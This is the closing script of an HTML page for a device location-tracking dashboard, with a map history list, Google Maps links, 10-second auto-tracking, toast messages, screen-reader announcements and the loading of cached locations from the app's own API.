                <div class="h-item" role="listitem" onclick="flyTo(${h.lat},${h.lng})" tabindex="0"
                     aria-label="Location at ${h.time}, ${h.lat.toFixed(4)} ${h.lng.toFixed(4)}">
                    <span class="h-time">${h.time}</span>
                    <span class="h-coords">${h.lat.toFixed(5)}, ${h.lng.toFixed(5)}</span>
                </div>
            `,
                )
                .join("");
        }

        function flyTo(lat, lng) {
            map.flyTo([lat, lng], 17, { duration: 1.2 });
        }

        // ===== GOOGLE MAPS =====
        function openGoogleMaps() {
            if (currentLat !== null && currentLng !== null) {
                window.open(
                    `https://www.google.com/maps?q=${currentLat},${currentLng}`,
                    "_blank",
                );
                announce("Opened location in Google Maps");
            }
        }

        // ===== AUTO TRACK =====
        function toggleAutoTrack() {
            const btn = document.getElementById("btn-auto");
            if (autoInterval) {
                clearInterval(autoInterval);
                autoInterval = null;
                btn.classList.remove("active");
                btn.innerHTML =
                    '<i data-lucide="timer" class="fab-ic" style="width:18px;height:18px;"></i>';
                btn.setAttribute("aria-label", "Enable auto-tracking");
                showToast("Auto-track stopped");
                announce("Auto-tracking disabled");
                lucide.createIcons();
            } else {
                autoInterval = setInterval(fetchLocation, 10000);
                btn.classList.add("active");
                btn.innerHTML =
                    '<i data-lucide="pause" class="fab-ic" style="width:18px;height:18px;"></i>';
                btn.setAttribute("aria-label", "Stop auto-tracking");
                showToast("Auto-tracking every 10s", false, true);
                announce("Auto-tracking enabled, refreshing every 10 seconds");
                lucide.createIcons();
                fetchLocation();
            }
        }

        // ===== TOAST =====
        function showToast(msg, isError = false, isSuccess = false) {
            const toast = document.getElementById("toast");
            toast.textContent = msg;
            toast.className =
                "toast show" +
                (isError ? " error" : "") +
                (isSuccess ? " success" : "");
            setTimeout(() => {
                toast.className = "toast";
            }, 3000);
        }

        // ===== SCREEN READER =====
        function announce(text) {
            const el = document.getElementById("sr-announce");
            el.textContent = "";
            setTimeout(() => {
                el.textContent = text;
            }, 50);
        }

        // ===== EVENT LISTENERS =====
        document
            .getElementById("btn-refresh")
            .addEventListener("click", fetchLocation);
        document
            .getElementById("btn-auto")
            .addEventListener("click", toggleAutoTrack);
        document
            .getElementById("btn-gmaps")
            .addEventListener("click", openGoogleMaps);
        document.getElementById("btn-gps").addEventListener("click", toggleGPS);

        document.getElementById("btn-history").addEventListener("click", () => {
            const panel = document.getElementById("history-panel");
            const isOpen = panel.style.display === "block";
            panel.style.display = isOpen ? "none" : "block";
            document
                .getElementById("btn-history")
                .classList.toggle("active", !isOpen);
        });

        document.getElementById("history-close").addEventListener("click", () => {
            document.getElementById("history-panel").style.display = "none";
            document.getElementById("btn-history").classList.remove("active");
        });

        // Keyboard support
        document
            .getElementById("history-list")
            .addEventListener("keydown", (e) => {
                if (e.key === "Enter" || e.key === " ") {
                    e.target.click();
                    e.preventDefault();
                }
            });

        // ===== LOAD CACHED HISTORY ON STARTUP =====
        async function loadCachedHistory() {
            // Only load history panel — do NOT show cached coordinates on map/stats
            // The live fetchLocation() call will show actual location if GPS is on
            try {
                const resp = await fetch(
                    "/api/device/" + deviceId + "/locations?limit=100",
                );
                const json = await resp.json();
                if (json.success && json.locations && json.locations.length > 0) {
                    json.locations.forEach(function (loc) {
                        locationHistory.push({
                            lat: loc.latitude,
                            lng: loc.longitude,
                            time: loc.timestamp
                                ? new Date(loc.timestamp).toLocaleTimeString()
                                : "--",
                            acc: loc.accuracy,
                        });
                    });
                    renderHistory();
                    // Do NOT updateMap/updateStats with cached data
                    // Live fetchLocation() will handle that
                }
            } catch (e) {
                // Ignore — will fetch live location anyway
            }
        }

        // ===== AUTO INIT =====
        loadCachedHistory().then(function () {
            fetchLocation();
        });
    </script>
</body>

</html>
